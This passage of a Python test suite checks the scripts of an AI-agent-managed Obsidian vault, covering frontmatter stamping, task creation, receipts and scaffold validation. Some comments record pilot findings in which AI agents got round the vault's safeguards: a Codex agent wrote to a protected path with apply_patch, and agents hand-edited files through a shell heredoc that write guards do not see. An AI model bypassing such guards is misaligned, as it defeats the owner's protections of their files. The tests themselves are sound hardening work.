        #     manifest on disk must be byte-identical afterwards: a build that
        #     quietly shipped a manifest missing one agent is exactly what Scaffold
        #     Check would then trust.
        clone5 = manifest_clone("manifest-agent-malformed-id")
        mack = clone5 / "06 AI Team/Agents/Mack/AGENT.md"
        mack.write_text(set_id("not-a-uuid")(mack.read_text(encoding="utf-8")), encoding="utf-8")
        m5 = clone5 / ".icor-for-life/manifest.json"
        m5_before = m5.read_bytes()
        r = expect_refusal("build-scaffold-manifest/agent-malformed-id", [str(clone5 / builder)])
        checks += 1
        if r.returncode != 0 and "Mack" not in (r.stderr or ""):
            fails.append("build-scaffold-manifest/agent-malformed-id: refused, but the FAIL line does not name the agent")
        if m5.read_bytes() != m5_before:
            fails.append("build-scaffold-manifest/agent-malformed-id: refused, but still wrote manifest.json")
        # 2h. ...and --check must call the manifest stale when an agent's identity
        #     changed under it: a valid but different id on Penn is a different
        #     agents entry, so the manifest on disk no longer describes the tree.
        clone6 = manifest_clone("manifest-agent-id-changed")
        penn6 = clone6 / "06 AI Team/Agents/Penn/AGENT.md"
        penn6.write_text(set_id("11111111-1111-4111-8111-111111111111")(penn6.read_text(encoding="utf-8")), encoding="utf-8")
        r = expect_fail("build-scaffold-manifest/agent-id-changed", [str(clone6 / builder), "--check"])
        checks += 1
        if r.returncode != 0 and "agents" not in (r.stderr or ""):
            fails.append("build-scaffold-manifest/agent-id-changed: went red, but not for the agents list")
    # 3. stamp-processed must CREATE the frontmatter block on a note that has
    #    none. The daily note ships blank on purpose (00 Daily Scratchpad/
    #    README.md: "frontmatter appears only when the team stamps it"), and
    #    until 2026-09-14 the stamping script refused exactly that shape, so
    #    the last step of SOP-1001 was unreachable on a real member's note.
    #    Pilot A finding F3: on Codex that dead end is what sent the model
    #    past the script and straight at the protected path with apply_patch.
    def _stamp(note, *extra):
        return subprocess.run(
            [PY, str(HERE / "stamp-processed.py"), str(note),
             "--summary", "x", "--into", "[[y]]"] + list(extra),
            capture_output=True, text=True)

    def _front(note):
        t = note.read_text(encoding="utf-8")
        if not t.startswith("---\n"):
            return None, t
        e = t.find("\n---\n", 4)
        return (None, t) if e == -1 else (t[4:e], t[e + 5:])

    blankdir = tmp / "stamp-vault" / "00 Daily Scratchpad" / "2026" / "09"
    blankdir.mkdir(parents=True)
    blank = blankdir / "2026-09-13.md"
    BLANK_BODY = "bought milk\nrang Dana about the pilot\n"
    blank.write_text(BLANK_BODY, encoding="utf-8")
    checks += 1
    r = _stamp(blank)
    if r.returncode != 0:
        fails.append("stamp-processed/blank-note-gets-a-block: refused a note with no "
                     "frontmatter (%s); the daily note ships blank by design"
                     % (r.stdout + r.stderr).strip()[:160])
    fm, body = _front(blank)
    checks += 1
    if fm is None:
        fails.append("stamp-processed/blank-note-gets-a-block: no frontmatter block "
                     "was created")
    else:
        for want in ("type: scratchpad", "date: 2026-09-13", "processed: true",
                     "processed_summary:", "processed_into:"):
            checks += 1
            if want not in fm:
                fails.append("stamp-processed/blank-note-gets-a-block: the created "
                             "block carries no `%s` (GL-1002 per-type table)" % want)
    # and the words are the whole point of the protected path: a stamp that
    # rewrites the body is the thing hard rule 1 forbids.
    checks += 1
    if body != BLANK_BODY:
        fails.append("stamp-processed/blank-note-body-untouched: the body changed "
                     "from %r to %r" % (BLANK_BODY, body))

    # 3b. the SECOND stamp must not leave two `processed` keys. YAML takes the
    #     last one, so a duplicate works by luck and reads as a corrupt block
    #     in the Properties panel (pilot A finding F4).
    half = tmp / "half-stamped.md"
    half.write_text("---\ntype: scratchpad\ndate: 2026-09-14\nprocessed: false\n"
                    "---\nthe user's words\n", encoding="utf-8")
    checks += 1
    r = _stamp(half)
    if r.returncode != 0:
        fails.append("stamp-processed/processed-false-is-replaced: refused a note "
                     "that carries `processed: false` (%s)"
                     % (r.stdout + r.stderr).strip()[:160])
    fm2, body2 = _front(half)
    checks += 1
    n_keys = len([l for l in (fm2 or "").splitlines()
                  if l.split(":", 1)[0].strip() == "processed"])
    if n_keys != 1:
        fails.append("stamp-processed/processed-false-is-replaced: %d `processed` "
                     "keys in the block, expected exactly 1" % n_keys)
    checks += 1
    if "processed: true" not in (fm2 or ""):
        fails.append("stamp-processed/processed-false-is-replaced: the surviving key "
                     "is not `processed: true`")
    checks += 1
    if body2 != "the user's words\n":
        fails.append("stamp-processed/processed-false-is-replaced: the body changed")

    # 4. stamp-processed must reject a double stamp, and change nothing when
    #    it does. A refusal that has already written is not a refusal.
    once = tmp / "once.md"; once.write_text("---\ntype: capture\n---\nbody\n")
    _stamp(once)
    before = once.read_text(encoding="utf-8")
    expect_fail("stamp-processed/double-stamp",
                [str(HERE / "stamp-processed.py"), str(once), "--summary", "x", "--into", "[[y]]"],
                unchanged=[once])
    checks += 1
    if once.read_text(encoding="utf-8") != before:
        fails.append("stamp-processed/double-stamp: refused and wrote anyway")
    # 4b. an UNTERMINATED block is still a refusal: a note that opens a
    #     frontmatter fence and never closes it is damaged, and guessing where
    #     it ends would rewrite the user's words.
    torn = tmp / "torn.md"; torn.write_text("---\ntype: scratchpad\nnever closed\n")
    expect_fail("stamp-processed/unterminated-frontmatter",
                [str(HERE / "stamp-processed.py"), str(torn), "--summary", "x", "--into", "[[y]]"],
                unchanged=[torn])
    # 5. stamp-processed must reject a non-wikilink --into
    n2 = tmp / "n2.md"; n2.write_text("---\ntype: capture\n---\nbody\n")
    expect_fail("stamp-processed/bad-wikilink",
                [str(HERE / "stamp-processed.py"), str(n2), "--summary", "x", "--into", "not-a-link"],
                unchanged=[n2])
    # 6. stamp-processed must refuse to archive outside 01 Inbox/Outer World
    n3 = tmp / "n3.md"; n3.write_text("---\ntype: capture\n---\nbody\n")
    expect_fail("stamp-processed/archive-outside-inbox",
                [str(HERE / "stamp-processed.py"), str(n3), "--summary", "x", "--into", "[[y]]", "--archive"],
                unchanged=[n3])
    # 6a. THE DATE-LINKS LINE MUST BE ABLE TO SAY A NUMBER (pilot A finding
    #     F7, pilot B F3). `link-dates-to-daily-notes.py --check --json`
    #     printed its JSON object AND a human OK line on the same stdout, so
    #     checkpoint.py's json.loads raised on every clean vault, the count was
    #     reported as None, and the report said "did not answer" forever. The
    #     honest wording is what made a permanent failure look like a state.
    jv = tmp / "json-vault"
    (jv / "04 Inner World" / "Journal" / "2026" / "09").mkdir(parents=True)
    (jv / "00 Daily Scratchpad" / "2026" / "09").mkdir(parents=True)
    (jv / "06 AI Team" / "AI Team Knowledge" / "Tasks" / "open").mkdir(parents=True)
    (jv / "06 AI Team" / "AI Team Knowledge" / "Session Logs" / "2026" / "09").mkdir(parents=True)
    (jv / "03 WiP").mkdir()
    (jv / ".obsidian").mkdir()
    (jv / "AGENTS.md").write_text("# fixture\n", encoding="utf-8")
    (jv / ".obsidian" / "daily-notes.json").write_text(
        '{"folder": "00 Daily Scratchpad", "format": "YYYY/MM/YYYY-MM-DD"}\n',
        encoding="utf-8")
    (jv / "04 Inner World" / "Journal" / "2026" / "09" / "2026-09-14_a.md").write_text(
        "---\ntype: journal\ndate: 2026-09-14\njournal_type: note\n---\n"
        "no date is mentioned in this body at all\n", encoding="utf-8")
    checks += 1
    rj = subprocess.run([PY, str(HERE / "link-dates-to-daily-notes.py"), str(jv),
                         "--check", "--json"], capture_output=True, text=True)
    _doc = None
    try:
        _doc = json.loads(rj.stdout)
    except ValueError as _e:
        fails.append("link-dates-to-daily-notes/json-stdout-is-json: --json stdout "
                     "does not parse (%s), so every caller reads None forever" % _e)
    checks += 1
    if _doc is not None and "mentions" not in _doc:
        fails.append("link-dates-to-daily-notes/json-stdout-is-json: no `mentions` key")
    # and the report a member actually reads must carry the number
    checks += 1
    rc = subprocess.run([PY, str(HERE / "checkpoint.py"), str(jv)],
                        capture_output=True, text=True)
    if "did not answer" in rc.stdout or "date links       : unknown" in rc.stdout:
        fails.append("checkpoint/date-links-can-go-green: the report still says the "
                     "linker did not answer on a fixture whose links are correct")
    checks += 1
    if not _re5date.search(rc.stdout):
        fails.append("checkpoint/date-links-can-go-green: no `date links : <n>` line "
                     "in the report:\n%s" % rc.stdout[:300])

    # 6b. Every scratchpad path a procedure NAMES must be a path the validator
    #     accepts. SOP-1001 step 1 said `00 Daily Scratchpad/YYYY-MM-DD.md`;
    #     GL-1004 and .obsidian/daily-notes.json both say YYYY/MM/, and
    #     validate-scaffold.py fails a loose note at the room root. Silas
    #     seeded the pilot fixture by FOLLOWING the SOP and the validator
    #     refused him (pilot A finding F5). A procedure that walks its reader
    #     into a red gate is the defect, so the text is what this checks.
    import re as _re5
    # a DAILY NOTE named straight at the room root: one path segment carrying
    # a date or the date placeholder. The room's own README.md is not one.
    _loose = _re5.compile(
        r"00 Daily Scratchpad/(?!YYYY/MM/)[^\s`)/\]]*"
        r"(?:YYYY-MM-DD|\d{4}-\d{2}-\d{2})[^\s`)/\]]*\.md")
    for _doc in sorted((ROOT / "06 AI Team" / "AI Team Knowledge").rglob("*.md")):
        if "_archive" in _doc.parts or "Session Logs" in _doc.parts:
            continue
        checks += 1
        _hits = _loose.findall(_doc.read_text(encoding="utf-8", errors="ignore"))
        if _hits:
            fails.append("docs/scratchpad-path-is-date-nested: %s names %s, which "
                         "validate-scaffold.py refuses (GL-1004: 00 Daily "
                         "Scratchpad/YYYY/MM/)"
                         % (_doc.relative_to(ROOT).as_posix(), _hits[0]))

    # 6c. new-task.py must be able to write every field GL-1002 declares for
    #     a task (pilot B finding F5). It could not write `due`, so both pilot
    #     CLIs generated the file and then hand-edited the file they had just
    #     generated, on Codex through a shell heredoc that no write guard sees.
    nt = HERE / "new-task.py"
    _gl = (ROOT / "06 AI Team/AI Team Knowledge/Guidelines"
           / "GL-1002-frontmatter-conventions.md").read_text(encoding="utf-8")
    _row = [l for l in _gl.splitlines() if l.startswith("| task |")]
    checks += 1
    if not _row:
        fails.append("new-task/writes-every-declared-field: GL-1002 has no `task` "
                     "row, so the fields this script owes cannot be read")
    else:
        _declared = set(re.findall(r"[a-z_]+", _row[0].split("|")[3]))
        _flags = subprocess.run([PY, str(nt), "new", "--help"],
                                capture_output=True, text=True).stdout
        for _field in sorted(_declared & {"due", "related"}):
            checks += 1
            # anchored: `--due` is a substring of `--dueX`, and a substring
            # test is a check that a rename cannot fail
            if not re.search(r"--%s\b" % _field, _flags):
                fails.append("new-task/writes-every-declared-field: GL-1002 lists "
                             "`%s` on a task and `new-task.py new` has no --%s, so "
                             "the next step is a hand-edit of a generated file"
                             % (_field, _field))
    checks += 1
    _bad = subprocess.run([PY, str(nt), "new", "--slug", "red-test-due-shape",
                           "--title", "x", "--assignee", "mack",
                           "--due", "20-09-2026"], capture_output=True, text=True)
    if _bad.returncode == 0:
        fails.append("new-task/due-must-be-iso: accepted `20-09-2026` as a due date")
        for _q in (ROOT / "06 AI Team/AI Team Knowledge/Tasks/open").glob("*red-test-due-shape*"):
            _q.unlink()

    # 6d. A RECEIPT MUST NOT NAME AN OUTPUT THAT REWRITES ITSELF (pilot B
    #     finding F8). Codex's first pilot session listed session.json and
    #     quality.json as outputs; both are rewritten by the next SessionStart
    #     hook, so that receipt could never verify again from session 2 on.
    #     The receipt model is "these bytes, unchanged", and the machine layer
    #     is the one place in the vault where that promise cannot hold.
    cpv = tmp / "receipt-outputs-vault"
    (cpv / "06 AI Team/AI Team Knowledge/Session Logs/2026/09").mkdir(parents=True)
    (cpv / "06 AI Team/AI Team Knowledge/Tasks/open").mkdir(parents=True)
    (cpv / ".icor-for-life" / "scripts").mkdir(parents=True)
    (cpv / "03 WiP").mkdir()
    (cpv / "AGENTS.md").write_text("# fixture\n", encoding="utf-8")
    _log = cpv / "06 AI Team/AI Team Knowledge/Session Logs/2026/09/2026-09-14-01-00_larry_x.md"
    _log.write_text("---\ntype: session-log\n---\n\n# x\n", encoding="utf-8")
    (cpv / ".icor-for-life" / "scripts" / "session.json").write_text(
        json.dumps({"schema": 1, "session_id": "red-test-session",
                  "started": "2026-09-14T01:00:00Z", "id_source": "fixture"}),
        encoding="utf-8")
    (cpv / ".icor-for-life" / "scripts" / "quality.json").write_text(
        '{"health": "ok"}\n', encoding="utf-8")
    _cp = [PY, str(HERE / "checkpoint.py"), str(cpv), "--write-receipt",
           "--output", "06 AI Team/AI Team Knowledge/Session Logs/2026/09/2026-09-14-01-00_larry_x.md"]
    expect_fail("checkpoint/receipt-refuses-a-self-writing-output",
                _cp[1:] + ["--output", ".icor-for-life/scripts/session.json"])
    checks += 1
    if list((cpv / ".icor-for-life" / "scripts" / "receipts").glob("*.json")) \
            if (cpv / ".icor-for-life" / "scripts" / "receipts").is_dir() else []:
        fails.append("checkpoint/receipt-refuses-a-self-writing-output: it refused "
                     "and wrote the receipt anyway")
    # the control: the same call naming only the session log must succeed, or
    # the red above is just "receipts are broken"
    expect_ok("checkpoint/receipt-names-the-work-control", _cp[1:])

    # 6e. THE START RITUAL MUST POINT AT THE RECEIPT (pilot B finding F6).
    #     The receipt carries the machine-readable answer to "what did the
    #     last session do" and nothing told a resuming session it existed, so
    #     both CLIs rebuilt the answer out of the session log's prose.
    checks += 1
    # `input=""` is not decoration. Without it stdin is INHERITED, and
    # session-start.py reads stdin when no host sent a session id, so this
    # case waits for an EOF that never comes whenever the suite is run from a
    # pipe that stays open. It hung a whole run for ten minutes with no output
    # at all, which reads exactly like a slow suite and is not one.
    _ss = subprocess.run([PY, str(HERE / "session-start.py")],
                         capture_output=True, text=True, input="",
                         env=dict(os.environ, CLAUDE_PROJECT_DIR=str(cpv)))
    if "last receipt:" not in _ss.stdout:
        fails.append("session-start/names-the-last-receipt: the start ritual says "
                     "nothing about the newest receipt, so the resume surface is "
                     "prose again:\n%s" % _ss.stdout[:400])
    elif "red-test-session" not in _ss.stdout:
        fails.append("session-start/names-the-last-receipt: it printed a receipt "
                     "line that does not name the session the receipt belongs to")

    # 7. new-journal-entry must reject a bad date
    expect_fail("new-journal-entry/bad-date",
                [str(HERE / "new-journal-entry.py"), "--date", "27.08.2026",
                 "--slug", "x", "--journal-type", "thought", "--original", "t"])
    # 8. new-journal-entry must reject a fifth journal type (GL-1003: there
    #    are exactly four, ever)
    expect_fail("new-journal-entry/bad-journal-type",
                [str(HERE / "new-journal-entry.py"), "--date", "2026-08-27",
                 "--slug", "x", "--journal-type", "rant", "--original", "t"])
    # 8b. new-journal-entry must reject a bad format
    expect_fail("new-journal-entry/bad-format",
                [str(HERE / "new-journal-entry.py"), "--date", "2026-08-27",
                 "--slug", "x", "--journal-type", "thought", "--format", "fax",
                 "--original", "t"])
    # 9. new-journal-entry must reject empty original text
    expect_fail("new-journal-entry/empty-original",
                [str(HERE / "new-journal-entry.py"), "--date", "2026-08-27",
                 "--slug", "x", "--journal-type", "thought", "--original", "  "])
    # 10. new-task must reject an uppercase slug
    expect_fail("new-task/bad-slug",
                [str(HERE / "new-task.py"), "new", "--slug", "Bad_Slug",
                 "--title", "t", "--assignee", "penn"])
    # 11. new-session-log must reject a bad slug
    expect_fail("new-session-log/bad-slug",
                [str(HERE / "new-session-log.py"), "--agent", "larry", "--slug", "Bad Slug"])
    # 12. import-file must reject a destination outside the six rooms
    srcf = tmp / "note.md"; srcf.write_text("hello\n")
    expect_fail("import-file/dest-outside-rooms",
                [str(HERE / "import-file.py"), str(srcf), "--dest", "rogue/note.md"])
    # 13. import-file must reject a binary into a knowledge room
    binf = tmp / "pic.png"; binf.write_bytes(b"\x89PNG")
    expect_fail("import-file/binary-into-knowledge",
                [str(HERE / "import-file.py"), str(binf), "--dest", "04 Inner World/My Life/Topics/pic.png"])
    # 14. import-file must refuse to overwrite
    expect_fail("import-file/overwrite",
                [str(HERE / "import-file.py"), str(srcf), "--dest", "06 AI Team/AI Team Knowledge/Guidelines/GL-1001-the-six-rooms.md"])
    # 15. import-inventory must reject a missing source
    expect_fail("import-inventory/missing-source",
                [str(HERE / "import-inventory.py"), str(tmp / "does-not-exist")])
    # 16. add-mcp-server must refuse a secret-shaped value in args
    expect_fail("add-mcp-server/secret-in-args",
                [str(HERE / "add-mcp-server.py"), "--name", "redtest-leak",
                 "--command", "npx", "--args", "--token=sk-abcdef1234567890abcdef1234567890"])
    # 17. add-mcp-server must refuse a lowercase env var name
    expect_fail("add-mcp-server/bad-env-name",
                [str(HERE / "add-mcp-server.py"), "--name", "redtest-env",
                 "--command", "npx", "--env", "not_upper"])
    # 18. add-mcp-server must refuse command AND url together
    expect_fail("add-mcp-server/two-transports",
                [str(HERE / "add-mcp-server.py"), "--name", "redtest-two",
                 "--command", "npx", "--url", "https://example.com/mcp"])
    # 19. validate-scaffold must reject a project without a goal link
    bad3 = tmp / "bad-scaffold-3"
    shutil.copytree(ROOT, bad3, ignore=shutil.ignore_patterns(".obsidian"))
    (bad3 / "04 Inner World/My Life/Projects/rogue.md").write_text(
        "---\ntype: project\nstatus: active\n---\n# Rogue\n")
    expect_fail("validate-scaffold/project-without-goal", [str(HERE / "validate-scaffold.py"), str(bad3)])
    # 20. validate-scaffold must reject a goal with a foreign status
    bad4 = tmp / "bad-scaffold-4"
    shutil.copytree(ROOT, bad4, ignore=shutil.ignore_patterns(".obsidian"))
    (bad4 / "04 Inner World/My Life/Goals/rogue-goal.md").write_text(
        "---\ntype: goal\nstatus: someday\n---\n# Rogue goal\n")
    expect_fail("validate-scaffold/goal-bad-status", [str(HERE / "validate-scaffold.py"), str(bad4)])
    # 20b-20d. validate-scaffold check 10: a `type: note` must carry a
    #     note_type from the set and be filed under at least one of
    #     projects / key_elements / topics (GL-1002, GL-1007). Three reds,
    #     each for its own reason, then a control that a well-formed note
    #     passes so the reds are about the note and not the folder.
    def note_vault(name, front):
        v = tmp / name
        shutil.copytree(ROOT, v, ignore=shutil.ignore_patterns(".obsidian"))
        bring_obsidian_config(v)
        (v / "04 Inner World/Notes/probe-note.md").write_text(f"---\n{front}---\n# Probe\n")
        return v
    r = expect_fail("validate-scaffold/note-without-note-type",
                    [str(HERE / "validate-scaffold.py"),
                     str(note_vault("bad-note-1", 'type: note\nprojects: ["[[x]]"]\n'))])
    checks += 1
    if r.returncode != 0 and "note_type" not in (r.stderr or ""):
        fails.append("validate-scaffold/note-without-note-type: went red, but not for note_type")
    expect_fail("validate-scaffold/note-bad-note-type",
                [str(HERE / "validate-scaffold.py"),
                 str(note_vault("bad-note-2", 'type: note\nnote_type: rant\ntopics:\n  - "[[t]]"\n'))])
    r = expect_fail("validate-scaffold/note-filed-under-nothing",
                    [str(HERE / "validate-scaffold.py"),
                     str(note_vault("bad-note-3", "type: note\nnote_type: reference\nprojects: []\nkey_elements:\ntopics: []\n"))])
    checks += 1
    if r.returncode != 0 and "filed under nothing" not in (r.stderr or ""):
        fails.append("validate-scaffold/note-filed-under-nothing: went red, but not for the missing link")
    r = subprocess.run([PY, str(HERE / "validate-scaffold.py"),
                        str(note_vault("good-note", 'type: note\nnote_type: meeting\nkey_elements:\n  - "[[k]]"\n'))],
                       capture_output=True, text=True)
    checks += 1
    if r.returncode != 0:
        fails.append("validate-scaffold/note-clean-control: rejected a well-formed note, so the three reds prove nothing: "
                     + (r.stderr.strip().splitlines() or ["?"])[-1])
    # 20e. validate-scaffold check 11: .obsidian/daily-notes.json must not
    #     carry a `template` key (GL-1007: the daily scratchpad stays
    #     blank). The fixtures strip .obsidian, so the file is planted;
    #     a key with an empty value is red too, because the KEY is the
    #     setting. Control: the shipped file passes.
    def daily_vault(name, cfg):
        v = tmp / name
        shutil.copytree(ROOT, v, ignore=shutil.ignore_patterns(".obsidian"))
        bring_obsidian_config(v)
        (v / ".obsidian/daily-notes.json").write_text(_json.dumps(cfg))
        return v
    r = expect_fail("validate-scaffold/daily-note-template-key",
                    [str(HERE / "validate-scaffold.py"),
                     str(daily_vault("bad-daily-1", {"folder": "00 Daily Scratchpad", "format": "YYYY-MM-DD",
                                                     "template": "06 AI Team/AI Team Knowledge/Templates/journal.md"}))])
    checks += 1
    if r.returncode != 0 and "template key" not in (r.stderr or ""):
        fails.append("validate-scaffold/daily-note-template-key: went red, but not for the template key")
    expect_fail("validate-scaffold/daily-note-template-key-empty",
                [str(HERE / "validate-scaffold.py"),
                 str(daily_vault("bad-daily-2", {"folder": "00 Daily Scratchpad", "template": ""}))])
    shipped = ROOT / ".obsidian/daily-notes.json"
    if shipped.is_file():
        r = subprocess.run([PY, str(HERE / "validate-scaffold.py"),
                            str(daily_vault("good-daily", _json.loads(shipped.read_text())))],
                           capture_output=True, text=True)
        checks += 1
        if r.returncode != 0:
            fails.append("validate-scaffold/daily-note-clean-control: rejected the shipped daily-notes.json: "
                         + (r.stderr.strip().splitlines() or ["?"])[-1])
    else:
        skip("validate-scaffold/daily-note-clean-control", "no .obsidian/daily-notes.json in this vault to use as the control")

    # 21. new-base must reject an entity type not in the registry
    expect_fail("new-base/unknown-entity",
                [str(HERE / "new-base.py"), "spaceship"])
    # 22. new-base must refuse to overwrite an existing .base
    expect_fail("new-base/overwrite",
                [str(HERE / "new-base.py"), "person"])
    # 23. new-base must refuse a registry column GL-1002 does not declare
    bad5 = tmp / "bad-scaffold-5"
    shutil.copytree(ROOT, bad5, ignore=shutil.ignore_patterns(".obsidian"))
    gl = bad5 / "06 AI Team/AI Team Knowledge/Guidelines/GL-1002-frontmatter-conventions.md"
    gl.write_text(gl.read_text().replace(", last_contact, next_action |", " |"))
    (bad5 / "04 Inner World/Contacts/People/People.base").unlink()
    expect_fail("new-base/undeclared-column",
                [str(HERE / "new-base.py"), "person", "--root", str(bad5)])
    # 24. check-bases must reject a .base that is not valid YAML
    bad6 = tmp / "bad-scaffold-6"
    shutil.copytree(ROOT, bad6, ignore=shutil.ignore_patterns(".obsidian"))
    (bad6 / "04 Inner World/Notes/Documents.base").write_text(
        "views:\n  - type: table\n   bad indent: [unclosed\n")
    expect_fail("check-bases/invalid-yaml",
                [str(HERE / "check-bases.py"), str(bad6)])
    # 25. check-bases must reject a column GL-1002 does not declare
    bad7 = tmp / "bad-scaffold-7"
    shutil.copytree(ROOT, bad7, ignore=shutil.ignore_patterns(".obsidian"))
    pb = bad7 / "04 Inner World/Contacts/People/People.base"
    pb.write_text(pb.read_text().replace(
        "  note.role:\n    displayName: Role",
        "  note.astrological_sign:\n    displayName: Sign"))
    expect_fail("check-bases/undeclared-column",
                [str(HERE / "check-bases.py"), str(bad7)])
    # 26. check-bases must reject two bases claiming one collection
    #     (the exact defect found live in a sibling vault)
    bad8 = tmp / "bad-scaffold-8"
    shutil.copytree(ROOT, bad8, ignore=shutil.ignore_patterns(".obsidian"))
    src_base = (bad8 / "04 Inner World/Contacts/People/People.base").read_text()
    (bad8 / "04 Inner World/Contacts/People 2.base").write_text(src_base)
    expect_fail("check-bases/duplicate-collection",
                [str(HERE / "check-bases.py"), str(bad8)])
    # 27. check-bases must reject a base with no views
    bad9 = tmp / "bad-scaffold-9"
    shutil.copytree(ROOT, bad9, ignore=shutil.ignore_patterns(".obsidian"))
    (bad9 / "04 Inner World/Notes/Documents.base").write_text(
        "filters:\n  and:\n    - file.ext == \"md\"\n")
    expect_fail("check-bases/no-views",
                [str(HERE / "check-bases.py"), str(bad9)])
    # 27b-27d. A collection is (folder, note.type), not a folder (GL-1006
    #     rule 3 exception, 2026-09-09): 04 Inner World/Notes ships
    #     Documents.base (type document) beside Notes.base (type note).
    #     Two reds that the loosened rule must still catch, then the
    #     control that the shipped two-base folder passes, or the reds
    #     are about the folder and prove nothing about the type.
    bad10 = tmp / "bad-scaffold-10"
    shutil.copytree(ROOT, bad10, ignore=shutil.ignore_patterns(".obsidian"))
    nb = bad10 / "04 Inner World/Notes/Notes.base"
    (nb.parent / "Notes 2.base").write_text(nb.read_text())
    r = expect_fail("check-bases/duplicate-type-in-folder",
                    [str(HERE / "check-bases.py"), str(bad10)])
    checks += 1
    if r.returncode != 0 and "(type note)" not in (r.stderr or ""):
        fails.append("check-bases/duplicate-type-in-folder: went red, but not for the duplicated type")
    bad11 = tmp / "bad-scaffold-11"
    shutil.copytree(ROOT, bad11, ignore=shutil.ignore_patterns(".obsidian"))
    (bad11 / "04 Inner World/Notes/All.base").write_text(
        'filters:\n  and:\n    - file.inFolder("04 Inner World/Notes")\n'
        '    - file.ext == "md"\nviews:\n  - type: table\n    name: All\n')
    expect_fail("check-bases/untyped-base-beside-typed",
                [str(HERE / "check-bases.py"), str(bad11)])
    r = subprocess.run([PY, str(HERE / "check-bases.py"), str(ROOT)], capture_output=True, text=True)
    checks += 1
    if r.returncode != 0:
        fails.append("check-bases/two-types-one-folder-control: rejected the shipped tree, so its reds are meaningless: "
                     + (r.stderr.strip().splitlines() or ["?"])[-1])
    elif not ((ROOT / "04 Inner World/Notes/Notes.base").is_file()
              and (ROOT / "04 Inner World/Notes/Documents.base").is_file()):
        fails.append("check-bases/two-types-one-folder-control: passed, but the folder does not hold both bases, so nothing was exercised")

    # 28-30. new-progress-report guards
    pr = HERE / "new-progress-report.py"
    wroot = tmp / "wip-root"
    (wroot / "03 WiP" / "2026-01-01-demo").mkdir(parents=True)
    # 28. must reject a WiP folder that does not exist
    expect_fail("new-progress-report/no-wip-folder",
                [str(pr), "--root", str(wroot), "--wip", "does-not-exist", "--phase", "One"])
    # 29. must reject more phases than a readable diagram holds
    expect_fail("new-progress-report/too-many-phases",
                [str(pr), "--root", str(wroot), "--wip", "2026-01-01-demo"]
                + [x for i in range(10) for x in ("--phase", f"Phase {i}")])
    # 30. must refuse to overwrite an existing report
    subprocess.run([PY, str(pr), "--root", str(wroot), "--wip", "2026-01-01-demo",
                    "--phase", "One"], capture_output=True)
    expect_fail("new-progress-report/overwrite",
                [str(pr), "--root", str(wroot), "--wip", "2026-01-01-demo", "--phase", "One"])

    # 31-36. stamp-processed, the binary route (GL-1002 ruling 2026-09-04):
    #        the wrapper note carries the stamp, the shelf is the archive.
    sp = HERE / "stamp-processed.py"
    BIN = b"%PDF-1.4\n\xff\xfe binary stream\n"  # not UTF-8, on purpose
    def capture_vault(name, shelf=BIN, source_file='"[[scan.pdf]]"'):
        """A minimal vault: the binary in the Scanner Inbox, its copy on the
        shelf, and the wrapper note in Documents that links the copy."""
        v = tmp / name
        for d in ("01 Inbox/Scanner Inbox", "05 Assets/Documents", "04 Inner World/Notes"):
            (v / d).mkdir(parents=True)
        (v / "01 Inbox/Scanner Inbox/scan.pdf").write_bytes(BIN)
        (v / "05 Assets/Documents/scan.pdf").write_bytes(shelf)
        fm = "---\ntype: document\ndoc_type: other\n"
        fm += f"source_file: {source_file}\n" if source_file else ""
        (v / "04 Inner World/Notes/scan.md").write_text(fm + "---\nbody\n")
        return v
    STAMP = ["--summary", "x", "--into", "[[y]]"]
    # 31. a binary passed as the note is refused by name, never decoded:
    #     first by suffix, then (a binary wearing .md) by the UTF-8 check
    #     that used to be the traceback
    v31 = capture_vault("capture-31")
    expect_refusal("stamp-processed/binary-as-note",
                   [str(sp), str(v31 / "01 Inbox/Scanner Inbox/scan.pdf")] + STAMP,
                   unchanged=[v31])
    (v31 / "bytes.md").write_bytes(BIN)
    expect_refusal("stamp-processed/binary-bytes-as-note",
                   [str(sp), str(v31 / "bytes.md")] + STAMP,
                   unchanged=[v31])
    # 32. --capture with a .md is refused (a markdown capture is its own note)
    v32 = capture_vault("capture-32")
    (v32 / "01 Inbox/Scanner Inbox/clip.md").write_text("---\ntype: capture\n---\nbody\n")
    expect_refusal("stamp-processed/capture-is-markdown",
                   [str(sp), str(v32 / "04 Inner World/Notes/scan.md")] + STAMP
                   + ["--capture", str(v32 / "01 Inbox/Scanner Inbox/clip.md")],
                   unchanged=[v32])
    # 33. --capture with a binary outside 01 Inbox is refused
    v33 = capture_vault("capture-33")
    (tmp / "outside.pdf").write_bytes(BIN)
    expect_refusal("stamp-processed/capture-outside-inbox",
                   [str(sp), str(v33 / "04 Inner World/Notes/scan.md")] + STAMP
                   + ["--capture", str(tmp / "outside.pdf")],
                   unchanged=[v33, tmp / "outside.pdf"])
    # 34. a wrapper note whose source_file does not resolve to one file on
    #     the shelf is refused: no source_file at all, and one that points
    #     at nothing
    v34 = capture_vault("capture-34", source_file=None)
    expect_refusal("stamp-processed/wrapper-without-source-file",
                   [str(sp), str(v34 / "04 Inner World/Notes/scan.md")] + STAMP
                   + ["--capture", str(v34 / "01 Inbox/Scanner Inbox/scan.pdf")],
                   unchanged=[v34])
    v34b = capture_vault("capture-34b", source_file='"[[nowhere.pdf]]"')
    expect_refusal("stamp-processed/source-file-unresolved",
                   [str(sp), str(v34b / "04 Inner World/Notes/scan.md")] + STAMP
                   + ["--capture", str(v34b / "01 Inbox/Scanner Inbox/scan.pdf")],
                   unchanged=[v34b])
    # 35. --archive and --capture together are refused
    v35 = capture_vault("capture-35")
    expect_refusal("stamp-processed/archive-and-capture",
                   [str(sp), str(v35 / "04 Inner World/Notes/scan.md")] + STAMP
                   + ["--archive", "--capture", str(v35 / "01 Inbox/Scanner Inbox/scan.pdf")],
                   unchanged=[v35])
    # 36. a forced sha256 mismatch is refused AND the inbox original still
    #     exists, unstamped. A guard that refuses correctly but deletes on
    #     the way out would pass every other test in this file.
    v36 = capture_vault("capture-36", shelf=b"not the same bytes")
    expect_refusal("stamp-processed/sha256-mismatch",
                   [str(sp), str(v36 / "04 Inner World/Notes/scan.md")] + STAMP
                   + ["--capture", str(v36 / "01 Inbox/Scanner Inbox/scan.pdf")],
                   unchanged=[v36])
    if not (v36 / "01 Inbox/Scanner Inbox/scan.pdf").is_file():
        fails.append("stamp-processed/sha256-mismatch: refused, yet the inbox original is GONE")
    if "processed: true" in (v36 / "04 Inner World/Notes/scan.md").read_text():
        fails.append("stamp-processed/sha256-mismatch: refused, yet the wrapper note got stamped")
    # 36b. And the control: a correct --capture must PASS, stamp the
    #      wrapper and remove the original, or the six reds prove nothing.
    v36b = capture_vault("capture-clean")
